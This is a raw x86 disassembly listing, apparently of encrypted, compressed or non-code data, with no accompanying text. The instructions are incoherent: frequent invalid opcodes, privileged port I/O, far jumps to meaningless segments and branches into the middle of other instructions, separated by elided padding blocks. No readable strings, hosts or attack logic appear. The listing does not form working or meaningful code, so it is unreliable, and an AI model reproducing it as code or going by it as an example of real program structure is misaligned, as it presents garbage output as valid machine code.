  42c70c:	(bad)  
  42c70d:	lds    ebx,FWORD PTR [eax]
  42c70f:	stos   BYTE PTR es:[edi],al
  42c710:	pop    esi
  42c711:	(bad)  
  42c712:	out    dx,eax
  42c713:	pushf  
  42c714:	pop    ds
  42c715:	push   es
  42c716:	push   cs
  42c717:	or     eax,DWORD PTR [ebp+0xd]
  42c71a:	add    eax,0xfeebdb0b
  42c71f:	adc    eax,0xe1c307d1
  42c724:	or     BYTE PTR [eax+ebx*4+0x330eeb62],bh
  42c72b:	nop
  42c72c:	xor    BYTE PTR [ecx+ecx*2+0x22fc7ed7],cl
  42c733:	std    
  42c734:	and    BYTE PTR [edi],dl
  42c736:	cmp    BYTE PTR [ebx+0x2bfc5bfc],0xbf
  42c73d:	jae    0x42c725
  42c73f:	frstor [esi+0x66]
  42c742:	push   ss
  42c743:	in     al,0xdc
  42c745:	push   ss
  42c746:	push   edi
  42c747:	sub    DWORD PTR [esi-0x15df8b89],edx
  42c74d:	ins    DWORD PTR es:[edi],dx
  42c74e:	adc    al,0xfc
  42c750:	fidivr DWORD PTR [esi+0x38]
  42c753:	aad    0xf5
  42c755:	push   0xffffff84
  42c757:	mov    gs,WORD PTR [eax]
  42c759:	nop
  42c75a:	xlat   BYTE PTR ds:[ebx]
  42c75b:	and    ebp,esi
  42c75d:	cmp    eax,0x6e0350cb
  42c762:	inc    ecx
  42c763:	repnz ins BYTE PTR es:[edi],dx
  42c765:	addr16 push edx
  42c767:	push   0x53316fce
  42c76c:	ins    BYTE PTR es:[edi],dx
  42c76d:	test   BYTE PTR [edi+0x75],dh
  42c770:	(bad)  [eax]
  42c772:	lock shl BYTE PTR [edi+edx*2-0x74],0x18
  42c778:	or     al,0x1e
  42c77a:	aaa    
  42c77b:	cmp    cl,BYTE PTR [edi]
  42c77d:	loope  0x42c70b
  42c77f:	or     al,al
  42c781:	xchg   DWORD PTR [edx+esi*2+0x615e4e09],esp
  42c788:	adc    al,0x5d
  42c78a:	stos   BYTE PTR es:[edi],al
  42c78b:	mov    bh,0x45
  42c78d:	inc    ebp
  42c78e:	test   BYTE PTR [edx+0x0],ch
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xb033a40e
  42c802:	ins    BYTE PTR es:[di],dx
  42c804:	hlt    
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	jge    0x42c7f0
  42c80e:	jnp    0x42c830
  42c810:	push   edx
  42c811:	jne    0x42c7f5
  42c813:	rcl    BYTE PTR [eax-0x28b10726],cl
  42c819:	and    ah,BYTE PTR [esi-0x16]
  42c81c:	repnz mov edi,0xe541f0dc
  42c822:	jmp    0x42c85f
  42c824:	loopne 0x42c830
  42c826:	int    0xf
  42c828:	mov    dh,0x4a
  42c82a:	sub    al,0x39
  42c82c:	mov    ecx,0x99af3f65
  42c831:	mov    esi,0x1c4b0428
  42c836:	adc    esp,esi
  42c838:	(bad)  
  42c839:	lods   eax,DWORD PTR ds:[esi]
  42c83a:	fnstcw WORD PTR [edi]
  42c83c:	sbb    ch,BYTE PTR [ebx+edx*4-0x1a]
  42c840:	(bad)  [edx+0x7a]
  42c843:	pusha  
  42c844:	popf   
  42c845:	pxor   mm4,QWORD PTR [esi]
  42c848:	xchg   esi,eax
  42c849:	or     edx,edi
  42c84b:	inc    edx
  42c84c:	inc    esi
  42c84d:	test   al,0xf3
  42c84f:	lods   eax,DWORD PTR ds:[esi]
  42c850:	inc    esp
  42c851:	push   ss
  42c852:	cs (bad) 
  42c854:	js     0x42c8ab
  42c856:	xlat   BYTE PTR ds:[ebx]
  42c857:	fcomp  QWORD PTR [eax]
  42c859:	add    eax,0xbdf85677
  42c85e:	fdivr  DWORD PTR [eax-0x1d235ee1]
  42c864:	or     DWORD PTR [esi],ebp
  42c866:	in     eax,0xc0
  42c868:	jg     0x42c83b
  42c86a:	push   0xf305cd87
  42c86f:	mov    edi,0xe3367fa6
  42c874:	mov    ds:0xd2f798bf,al
  42c879:	and    DWORD PTR ds:0xe7b83231,edi
  42c87f:	int3   
  42c880:	fisub  DWORD PTR [edx]
  42c882:	or     cl,dh
  42c884:	mov    eax,0x597988ae
  42c889:	cdq    
  42c88a:	mov    edi,0x633da906
  42c88f:	pop    edi
  42c890:	sbb    ebx,DWORD PTR [esi+0x72]
  42c893:	cmp    edx,DWORD PTR [edi+0x24]
  42c896:	pusha  
  42c897:	inc    ecx
  42c898:	pusha  
  42c899:	cld    
  42c89a:	jge    0x42c8d2
  42c89c:	xor    eax,0x5c3edd3f
  42c8a1:	and    al,0xe5
  42c8a3:	fstp   TBYTE PTR [eax]
  42c8a5:	sub    BYTE PTR [edx-0x2f],al
  42c8a8:	daa    
  42c8a9:	inc    DWORD PTR [edi-0x4]
  42c8ac:	icebp  
  42c8ad:	int3   
  42c8ae:	shl    BYTE PTR [edi-0x76559041],0x3b
  42c8b5:	or     eax,DWORD PTR [ebp+0x5d9723a3]
  42c8bb:	js     0x42c92e
  42c8bd:	ins    BYTE PTR es:[edi],dx
  42c8be:	sbb    ah,BYTE PTR [ebx+0x5822354]
  42c8c4:	into   
  42c8c5:	in     eax,dx
  42c8c6:	jle    0x42c931
  42c8c8:	das    
  42c8c9:	mov    edi,DWORD PTR [ebp+0x5e]
  42c8cc:	mov    ecx,0x7552137a
  42c8d1:	jl     0x42c8ee
  42c8d3:	pop    eax
  42c8d4:	sbb    DWORD PTR [ecx],edx
  42c8d6:	fdivr  st(2),st
  42c8d8:	into   
  42c8d9:	mov    dh,BYTE PTR [ebp-0x7]
  42c8dc:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42c8de:	add    BYTE PTR [esi+0x710faa20],cl
  42c8e4:	xor    eax,0x3b6bab22
  42c8e9:	mov    DWORD PTR [ecx-0x1623a72a],0x44185346
  42c8f3:	xchg   ebx,eax
  42c8f4:	call   DWORD PTR [eax-0x6a97d24]
  42c8fa:	jae    0x42c93d
  42c8fc:	lods   al,BYTE PTR ds:[esi]
  42c8fd:	xchg   ecx,eax
  42c8fe:	(bad)  
  42c8ff:	pop    eax
  42c900:	in     al,dx
  42c901:	jmp    0x42c8fd
  42c903:	fwait
  42c904:	mov    edi,DWORD PTR [eax]
  42c906:	mov    BYTE PTR [eax-0x7b],ch
  42c909:	ins    DWORD PTR es:[edi],dx
  42c90a:	xchg   esp,eax
  42c90b:	mov    ds:0xc285d2b2,eax
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xb1e5d8ca
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	stos   BYTE PTR es:[edi],al
  42c98d:	pop    edi
  42c98e:	int3   
  42c98f:	jo     0x42c9ca
  42c991:	push   esp
  42c992:	rcl    DWORD PTR [edi+edx*1],cl
  42c995:	push   ebp
  42c996:	cmp    eax,0xbcaa6858
  42c99b:	and    DWORD PTR [ecx+0x5a],esi
  42c99e:	test   BYTE PTR [ecx],bl
  42c9a0:	outs   dx,DWORD PTR ds:[esi]
  42c9a1:	and    edx,DWORD PTR [ecx-0x50]
  42c9a4:	ss push esi
  42c9a6:	push   edi
  42c9a7:	das    
  42c9a8:	inc    ebp
  42c9a9:	xchg   esp,eax
  42c9aa:	fs jge 0x42ca0c
  42c9ad:	xchg   BYTE PTR [edi-0x4d8f7084],al
  42c9b3:	dec    ecx
  42c9b4:	pop    eax
  42c9b5:	xor    ebx,DWORD PTR [edx+ebx*8+0x46]
  42c9b9:	in     al,dx
  42c9ba:	mov    esi,0x892ddc77
  42c9bf:	mov    ss,WORD PTR [edx+0x3a]
  42c9c2:	push   esi
  42c9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9c4:	jg     0x42c9ee
  42c9c6:	popf   
  42c9c7:	ret    
  42c9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9c9:	aaa    
  42c9ca:	cld    
  42c9cb:	cmc    
  42c9cc:	dec    ebx
  42c9cd:	mov    eax,ds:0xd6e5a30c
  42c9d2:	add    edx,DWORD PTR [edi]
  42c9d4:	mov    eax,0x229cdb77
  42c9d9:	push   ebp
  42c9da:	mov    ds:0x8fce6824,al
  42c9df:	mov    esi,eax
  42c9e1:	xchg   edi,eax
  42c9e2:	cmp    edx,DWORD PTR gs:[eax-0x40]
  42c9e6:	adc    ebp,eax
  42c9e8:	jo     0x42c9ad
  42c9ea:	and    eax,esi
  42c9ec:	and    bl,BYTE PTR [ebx-0x38cf6ede]
  42c9f2:	xlat   BYTE PTR ds:[ebx]
  42c9f3:	jmp    0x42c9ec
  42c9f5:	xchg   ecx,eax
  42c9f6:	aad    0x3b
  42c9f8:	out    dx,eax
  42c9f9:	imul   ebp,DWORD PTR [eax+ebx*8],0x57714cb
  42ca00:	retf   0x6a4
  42ca03:	int    0x67
  42ca05:	sbb    eax,0x57b9ead4
  42ca0a:	dec    edx
  42ca0b:	pop    ecx
  42ca0c:	cmp    esi,DWORD PTR [esi+0x3cad5ff0]
  42ca12:	fild   QWORD PTR [edi-0x371c22f3]
  42ca18:	out    0xb2,al
  42ca1a:	or     al,0x22
  42ca1c:	ss ja  0x42ca07
  42ca1f:	push   0x3b
  42ca21:	in     eax,0xf
  42ca23:	hlt    
  42ca24:	pop    edi
  42ca25:	fbld   TBYTE PTR [edx+0x3e]
  42ca28:	mov    esp,0xe0f277ab
  42ca2d:	jns    0x42c9e3
  42ca2f:	jae    0x42ca3a
  42ca31:	cwde   
  42ca32:	or     DWORD PTR [ebx],eax
  42ca34:	or     BYTE PTR [edi-0x1],dh
  42ca37:	xor    BYTE PTR [ebx],0x28
  42ca3a:	jg     0x42c9be
  42ca3c:	dec    ebx
  42ca3d:	sub    ecx,edx
  42ca3f:	mov    ebx,0xfb7b0982
  42ca44:	icebp  
  42ca45:	pushf  
  42ca46:	mov    eax,0x245439a9
  42ca4b:	jo     0x42caa2
  42ca4d:	mov    cl,0x4b
  42ca4f:	jne    0x42ca40
  42ca51:	dec    edi
  42ca52:	cs inc eax
  42ca54:	mov    cl,0x57
  42ca56:	rol    ebp,0x15
  42ca59:	mov    dh,BYTE PTR [eax+0xd]
  42ca5c:	scas   eax,DWORD PTR es:[edi]
  42ca5d:	repnz add DWORD PTR [edx],0xaaedf378
  42ca64:	adc    al,0xd2
  42ca66:	sbb    cl,BYTE PTR ds:0xd687d789
  42ca6c:	pop    ss
  42ca6d:	jbe    0x42ca17
  42ca6f:	jg     0x42ca92
  42ca71:	les    edx,FWORD PTR [eax]
  42ca73:	jecxz  0x42ca7e
  42ca75:	add    DWORD PTR [eax-0x14],ecx
  42ca78:	push   ss
  42ca79:	(bad)  
  42ca7a:	cs jmp 0xbe48:0x12066d86
  42ca82:	pop    esp
  42ca83:	ja     0x42ca3b
  42ca85:	sti    
  42ca86:	xchg   DWORD PTR [esi+edx*4+0x7959b3a3],ebp
  42ca8d:	xchg   DWORD PTR [esi],ebx
  42ca8f:	jge    0x42ca91
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x2d769140]
  42cb02:	ds out dx,eax
  42cb04:	cld    
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	pop    edx
  42cb0d:	push   ecx
  42cb0e:	lds    ecx,FWORD PTR [ebp+eax*1-0x15]
  42cb12:	imul   eax,DWORD PTR [ecx-0x6fb41ebf],0x31d3ff98
  42cb1c:	out    dx,eax
  42cb1d:	adc    cl,BYTE PTR [ebp-0x26bb6339]
  42cb23:	xor    eax,0xc767b6b6
  42cb28:	xchg   esi,eax
  42cb29:	mov    edi,0x87782db7
  42cb2e:	push   ebp
  42cb2f:	iret   
  42cb30:	lahf   
  42cb31:	scas   eax,DWORD PTR es:[edi]
  42cb32:	mov    bh,0x4f
  42cb34:	scas   al,BYTE PTR es:[edi]
  42cb35:	(bad)  
  42cb36:	nop
  42cb37:	pop    ss
  42cb38:	aad    0x3f
  42cb3a:	cld    
  42cb3b:	rcr    BYTE PTR [edx+0x1],cl
  42cb3e:	imul   esp,ebp,0xeba6165f
  42cb44:	add    DWORD PTR [eax-0x3b43723d],edi
  42cb4a:	int3   
  42cb4b:	ss cli 
  42cb4d:	jmp    0x4bea:0xea64e00
  42cb54:	les    edi,FWORD PTR [edx+0x21]
  42cb57:	inc    eax
  42cb58:	cmp    DWORD PTR [ecx],ecx
  42cb5a:	retf   
  42cb5b:	fmul   QWORD PTR [ecx+0x59]
  42cb5e:	(bad)  
  42cb5f:	into   
  42cb60:	cwde   
  42cb61:	test   al,0xec
  42cb63:	mov    ebx,0x9d1be107
  42cb68:	rcl    ecx,1
  42cb6a:	jmp    0x73e4:0x750b1aaa
  42cb71:	sub    dh,BYTE PTR [eax-0x77]
  42cb74:	jl     0x42cba6
  42cb76:	mov    edi,0xe346012
  42cb7b:	adc    DWORD PTR [ecx],eax
  42cb7d:	mov    BYTE PTR [esi+ebx*4+0xf],ch
  42cb81:	es add al,0x8d
  42cb84:	enter  0x17fb,0x89
  42cb88:	outs   dx,DWORD PTR ds:[esi]
  42cb89:	ret    0x39b0
  42cb8c:	mov    ds:0x779823d1,al
  42cb91:	sub    eax,0x3ba74300
  42cb96:	outs   dx,BYTE PTR ds:[esi]
  42cb97:	cli    
  42cb98:	adc    BYTE PTR [edi-0x49f5d2db],bl
  42cb9e:	lods   al,BYTE PTR ds:[esi]
  42cb9f:	pop    es
  42cba0:	jecxz  0x42cbc4
  42cba2:	(bad)  
  42cba3:	enter  0x736c,0xe2
  42cba7:	mov    al,ds:0x599c858e
  42cbac:	(bad)  
  42cbae:	cmp    DWORD PTR [ecx],ecx
  42cbb0:	dec    edx
  42cbb1:	mov    eax,ds:0x5add3d37
  42cbb6:	int    0x3
  42cbb8:	sbb    al,0x8
  42cbba:	jge    0x42cbb6
  42cbbc:	iret   
  42cbbd:	push   0xcbfb911e
  42cbc2:	ins    DWORD PTR es:[edi],dx
  42cbc3:	imul   ebp,DWORD PTR [edi+edi*4+0x4c3ef79d],0xffffffa8
  42cbcb:	(bad)  
  42cbcc:	mov    eax,ds:0xa9ff73b2
  42cbd1:	cdq    
  42cbd2:	cmp    al,0xb1
  42cbd4:	sar    bh,0xf1
  42cbd7:	lea    ebp,[eax+ecx*1]
  42cbda:	retf   
  42cbdb:	xor    eax,0xb02df006
  42cbe0:	shl    DWORD PTR [ecx],1
  42cbe2:	test   bl,0x49
  42cbe5:	fs push edx
  42cbe7:	call   0x2b20621a
  42cbec:	sbb    al,0xf5
  42cbee:	add    esp,DWORD PTR [edi+0x69e58466]
  42cbf4:	loop   0x42cb91
  42cbf6:	in     al,0xb5
  42cbf8:	push   eax
  42cbf9:	jg     0x42cb8b
  42cbfb:	push   cs
  42cbfc:	retf   0x1ea2
  42cbff:	adc    al,0x1d
  42cc01:	sub    ch,BYTE PTR [edi+0x653d0864]
  42cc07:	aas    
  42cc08:	mov    bl,dh
  42cc0a:	xor    eax,0x7260e487
  42cc0f:	mov    ch,0x0
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x633d9237
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	xlat   BYTE PTR ds:[ebx]
  42cc8d:	mov    ebx,0x4b9a5702
  42cc92:	pop    edx
  42cc93:	inc    ecx
  42cc94:	rol    DWORD PTR [esi*2-0x88b47a4],0x97
  42cc9c:	push   eax
  42cc9d:	add    al,0x7f
  42cc9f:	pushf  
  42cca0:	mov    bh,0x79
  42cca2:	stos   BYTE PTR es:[edi],al
  42cca3:	xchg   edi,eax
  42cca4:	jmp    0x8d8bc2c1
  42cca9:	fucomp st(3)
  42ccab:	xchg   edi,eax
  42ccac:	inc    edx
  42ccad:	dec    edx
  42ccae:	mov    cl,0xe8
  42ccb0:	cmp    DWORD PTR ds:0xd63eb20f,0xae4aa668
  42ccba:	add    ebp,eax
  42ccbc:	jl     0x42ccd1
  42ccbe:	mov    al,0x1
  42ccc0:	cmp    al,0x41
  42ccc2:	jg     0x42ccef
  42ccc4:	mov    eax,ds:0xc8a3e276
  42ccc9:	add    BYTE PTR [edi-0x39ecc91a],0xf
  42ccd0:	and    ebp,ecx
  42ccd2:	aas    
  42ccd3:	sub    DWORD PTR [ebp+esi*1-0x3d545d84],ecx
  42ccda:	adc    eax,0x22b46b4b
  42ccdf:	sbb    eax,0xaa396b1
  42cce4:	jns    0x42cc89
  42cce6:	xchg   BYTE PTR ds:0x52c03149,ch
  42ccec:	retf   0xd0e5
  42ccef:	mov    ch,0x70
  42ccf1:	xor    ebx,DWORD PTR [ebx+eiz*1]
  42ccf4:	repnz and bh,BYTE PTR [eax-0x50]
  42ccf8:	xlat   BYTE PTR ds:[ebx]
  42ccf9:	fdivr  DWORD PTR [ebp+0x5c]
  42ccfc:	popa   
  42ccfd:	push   esp
  42ccfe:	jae    0x42cceb
  42cd00:	mov    al,ds:0x44be8f81
  42cd05:	not    BYTE PTR [ebp-0x24ff054b]
  42cd0b:	add    al,0x9d
  42cd0d:	repz in eax,0x10
  42cd10:	icebp  
  42cd11:	retf   0x266d
  42cd14:	push   0x75daa45
  42cd19:	neg    ebp
  42cd1b:	push   0x66
  42cd1d:	imul   ecx,DWORD PTR [esp+edx*8],0xffffffe3
  42cd21:	lods   al,BYTE PTR ds:[esi]
  42cd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd23:	jbe    0x42cd8c
  42cd25:	jg     0x42cd97
  42cd27:	jne    0x42ccf2
  42cd29:	xor    BYTE PTR [ecx+0xf],0xc3
  42cd2d:	jno    0x42cce1
  42cd2f:	stos   BYTE PTR es:[edi],al
  42cd30:	leave  
  42cd31:	adc    ebp,0x799431f3
  42cd37:	mov    ebx,DWORD PTR [ecx-0xf616d1a]
  42cd3d:	mov    DWORD PTR [edx-0x80],edx
  42cd40:	lods   eax,DWORD PTR ds:[esi]
  42cd41:	adc    ah,cl
  42cd43:	add    dl,BYTE PTR [ebx+0x13]
  42cd46:	push   eax
  42cd47:	sbb    BYTE PTR [esi+0x25],ah
  42cd4a:	test   cl,bl
  42cd4c:	out    0x54,al
  42cd4e:	inc    edi
  42cd4f:	inc    ecx
  42cd50:	inc    ebx
  42cd51:	dec    BYTE PTR [edx+edx*2-0x7a]
  42cd55:	inc    eax
  42cd56:	dec    ecx
  42cd57:	cmp    eax,0xcbc22336
  42cd5c:	nop
  42cd5d:	mov    ch,0xfd
  42cd5f:	push   0x7b
  42cd61:	push   eax
  42cd62:	jbe    0x42cd40
  42cd64:	pop    eax
  42cd65:	fbld   TBYTE PTR [eax]
  42cd67:	jns    0x42cda7
  42cd69:	nop
  42cd6a:	lods   al,BYTE PTR ds:[esi]
  42cd6b:	or     al,0xfe
  42cd6d:	dec    edx
  42cd6e:	push   edi
  42cd6f:	xor    BYTE PTR [ebp+0x71],al
  42cd72:	jne    0x42cd8f
  42cd74:	outs   dx,DWORD PTR ds:[esi]
  42cd75:	cli    
  42cd76:	mov    bl,0x6e
  42cd78:	dec    DWORD PTR [ebp+0x42]
  42cd7b:	cli    
  42cd7c:	sub    ebx,DWORD PTR [edx-0x30ea1be6]
  42cd82:	add    edx,DWORD PTR [ecx+0x56f8572a]
  42cd88:	mov    bl,0x37
  42cd8a:	sbb    dh,BYTE PTR [ebx+0x5c]
  42cd8d:	xchg   edx,eax
  42cd8e:	pop    esi
  42cd8f:	fild   WORD PTR [eax]
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xd7
  42ce01:	xchg   edi,eax
  42ce02:	xlat   BYTE PTR ds:[ebx]
  42ce03:	pop    ecx
  42ce04:	add    al,0xe0
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	cmp    BYTE PTR [ebx],dh
  42ce0e:	inc    ebx
  42ce0f:	pushf  
  42ce10:	mov    al,0x4f
  42ce12:	(bad)  
  42ce13:	mov    edi,DWORD PTR [eax+0x7104a526]
  42ce19:	sbb    al,0xb8
  42ce1b:	jnp    0x42ce67
  42ce1d:	sub    eax,0xe540af4f
  42ce22:	loope  0x42ce49
  42ce24:	xlat   BYTE PTR ds:[ebx]
  42ce25:	stos   DWORD PTR es:[edi],eax
  42ce26:	shl    BYTE PTR [ebx+0x49],1
  42ce29:	xlat   BYTE PTR ds:[ebx]
  42ce2a:	stc    
  42ce2b:	fsubr  DWORD PTR [edx-0x6d4f3861]
  42ce31:	adc    al,0x12
  42ce33:	adc    DWORD PTR [eax],ebx
  42ce35:	sahf   
  42ce36:	jo     0x42ceaf
  42ce38:	jle    0x42ce15
  42ce3a:	(bad)  
  42ce3b:	jecxz  0x42cde6
  42ce3d:	adc    DWORD PTR [esi],eax
  42ce3f:	aad    0x6d
  42ce41:	jge    0x42ce59
  42ce43:	and    eax,0x84ef7f1f
  42ce48:	cmc    
  42ce49:	pop    ebp
  42ce4a:	out    0x98,eax
  42ce4c:	shl    DWORD PTR [eax],cl
  42ce4e:	bound  edx,QWORD PTR [edx+eiz*4+0x5b467048]
  42ce55:	sub    BYTE PTR [edx],0xc3
  42ce58:	shl    ebp,cl
  42ce5a:	jge    0x42ce0e
  42ce5c:	add    eax,0xd58363d7
  42ce61:	push   ecx
  42ce62:	ss jmp 0x12b9:0x6cab6d22
  42ce6a:	and    DWORD PTR [eax+0x4ca5bb37],ecx
  42ce70:	pop    edi
  42ce71:	cld    
  42ce72:	pop    ds
  42ce73:	xchg   ecx,eax
  42ce74:	jle    0x42ce8f
  42ce76:	pop    ebp
  42ce77:	push   esi
  42ce78:	mov    BYTE PTR [ecx-0x17af49a8],dh
  42ce7e:	retf   0x17cb
  42ce81:	jmp    0x42cee9
  42ce83:	test   cl,dl
  42ce85:	cdq    
  42ce86:	addr16 mov dh,0x2f
  42ce89:	inc    esi
  42ce8a:	pop    ecx
  42ce8b:	dec    esi
  42ce8c:	xchg   BYTE PTR [ebp+edi*1+0x46ed681d],al
  42ce93:	sti    
  42ce94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce95:	out    dx,eax
  42ce96:	nop
  42ce97:	adc    BYTE PTR [ebp+0x17b1e677],ah
  42ce9d:	mov    ds,eax
  42ce9f:	jno    0x42ce60
  42cea1:	out    0xde,eax
  42cea3:	(bad)  
  42cea4:	scas   al,BYTE PTR es:[edi]
  42cea5:	or     BYTE PTR [ebp+0x13],bl
  42cea8:	jl     0x42cee8
  42ceaa:	(bad)  [esi]
  42ceac:	hlt    
  42cead:	and    DWORD PTR [ebx-0x1290fb9e],eax
  42ceb3:	loopne 0x42cf07
  42ceb5:	dec    ebx
  42ceb6:	outs   dx,DWORD PTR ss:[esi]
  42ceb8:	mov    eax,0x808a988d
  42cebd:	push   es
  42cebe:	repz jmp 0x6beb:0xac9d0a6d
  42cec6:	xor    BYTE PTR [edx+0x54],al
  42cec9:	fld    DWORD PTR [edx]
  42cecb:	xchg   ebp,eax
  42cecc:	mov    bh,0x73
  42cece:	in     eax,0xcf
  42ced0:	adc    eax,0x1ea6dcdd
  42ced5:	inc    edi
  42ced6:	imul   ecx,DWORD PTR [esi],0x9f645a66
  42cedc:	adc    BYTE PTR [ebx+0x13],0xa1
  42cee0:	jo     0x42ce9f
  42cee2:	xchg   ebp,eax
  42cee3:	mov    ebx,0x47ab6df
  42cee8:	pop    esp
  42cee9:	or     DWORD PTR [ebx-0x73],eax
  42ceec:	iret   
  42ceed:	mov    al,ds:0x28435972
  42cef2:	xor    eax,0x925e990e
  42cef7:	pusha  
  42cef8:	neg    DWORD PTR [edi+0x416824c3]
  42cefe:	xor    BYTE PTR [edi],bh
  42cf00:	enter  0xfa9c,0x36
  42cf04:	push   ecx
  42cf05:	add    esi,DWORD PTR [ebx-0x784392b3]
  42cf0b:	mov    ch,0x2e
  42cf0d:	retf   0xdbb4
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	fistp  WORD PTR [ecx+ecx*1]
  42cf83:	data16 or cl,ah
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	imul   esi,DWORD PTR [ecx+0x1],0x35
  42cf90:	dec    ecx
  42cf91:	(bad)  
  42cf92:	shl    BYTE PTR ds:0x7b9d5a22,cl
  42cf98:	js     0x42d000
  42cf9a:	xchg   esi,eax
  42cf9b:	in     al,dx
  42cf9c:	loopne 0x42cfdd
  42cf9e:	xchg   esi,eax
  42cf9f:	sbb    al,0x2c
  42cfa1:	push   ss
  42cfa2:	push   ecx
  42cfa3:	cdq    
  42cfa4:	jp     0x42cfed
  42cfa6:	pop    ebp
  42cfa7:	jl     0x42cf74
  42cfa9:	loope  0x42cfc3
  42cfab:	test   al,0x41
  42cfad:	mov    al,0x27
  42cfaf:	jmp    0x42cf63
  42cfb1:	xchg   edi,eax
  42cfb2:	mov    bl,0x71
  42cfb4:	ret    0x5d85
  42cfb7:	or     edx,ecx
  42cfb9:	fsub   QWORD PTR [ebp+ecx*2+0xf1165a]
  42cfc0:	sbb    edx,DWORD PTR [ecx+eiz*1-0x51]
  42cfc4:	xchg   BYTE PTR [esi+0x16],cl
  42cfc7:	aad    0xdf
  42cfc9:	std    
  42cfca:	ret    
  42cfcb:	cmp    ebp,ebx
  42cfcd:	adc    eax,0x2d589f73
  42cfd2:	popf   
  42cfd3:	loopne 0x42d003
  42cfd5:	scas   al,BYTE PTR es:[edi]
  42cfd6:	in     al,0x3
  42cfd8:	jle    0x42d00c
  42cfda:	mov    edx,0xb177b1a4
  42cfdf:	push   edi
  42cfe0:	lea    ecx,[ebp+edi*4+0x6a23b3da]
  42cfe7:	sub    DWORD PTR [edx+0x345ac85f],esp
  42cfed:	pop    edx
  42cfee:	jp     0x42cfc9
  42cff0:	(bad)  
  42cff1:	mov    edx,0x41e869a3
  42cff6:	aad    0x55
  42cff8:	inc    esi
  42cff9:	(bad)  
  42cffa:	stc    
  42cffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cffc:	push   0x23cc2bea
  42d001:	jne    0x42d061
  42d003:	pop    edi
  42d004:	cmp    DWORD PTR [ebp+0xd3275ee],eax
  42d00a:	adc    ecx,eax
  42d00c:	adc    ebp,DWORD PTR [edx-0x2b1c4523]
  42d012:	and    ch,bl
  42d014:	fbstp  TBYTE PTR [eax+0x2c81e046]
  42d01a:	sbb    al,0xbb
  42d01c:	mov    BYTE PTR [edx],dh
  42d01e:	sahf   
  42d01f:	mov    esi,0x47beb77e
  42d024:	sti    
  42d025:	and    DWORD PTR [ecx-0xa],esi
  42d028:	pusha  
  42d029:	outs   dx,BYTE PTR ds:[esi]
  42d02a:	sahf   
  42d02b:	rcr    esp,cl
  42d02d:	dec    edi
  42d02e:	loopne 0x42cfeb
  42d030:	adc    al,0x82
  42d032:	and    DWORD PTR [edi],0xffffffc9
  42d035:	ja     0x42d017
  42d037:	ja     0x42d0b2
  42d039:	mov    dh,BYTE PTR [edi]
  42d03b:	sub    al,0x54
  42d03d:	fldz   
  42d03f:	imul   esp,DWORD PTR [esi+0x73c0479],0x47
  42d046:	mov    WORD PTR [edx-0x11],?
  42d049:	mov    ecx,0xb873a85c
  42d04e:	out    0xea,al
  42d050:	in     al,dx
  42d051:	call   0xd1179969
  42d056:	jnp    0x42d0a8
  42d058:	adc    ebp,edi
  42d05a:	or     BYTE PTR [ebx-0x43],dl
  42d05d:	xor    eax,0x5777294c
  42d062:	xlat   BYTE PTR ds:[ebx]
  42d063:	mov    BYTE PTR [edx+0x5a],bl
  42d066:	cmp    bl,dh
  42d068:	mov    BYTE PTR [ebx-0x28],bl
  42d06b:	out    0xf0,al
  42d06d:	neg    BYTE PTR [ebx-0x29178d16]
  42d073:	das    
  42d074:	jae    0x42d062
  42d076:	callw  0x36ee
  42d07a:	and    bh,BYTE PTR [ebx]
  42d07c:	xor    dh,cl
  42d07e:	dec    BYTE PTR [ebp-0xdf76aa7]
  42d084:	rcr    BYTE PTR [edi+0x2c],1
  42d087:	xor    eax,0x5070906d
  42d08c:	jnp    0x42d03e
  42d08e:	test   DWORD PTR [eax+0x0],esi
	...
  42d0f4:	push   eax
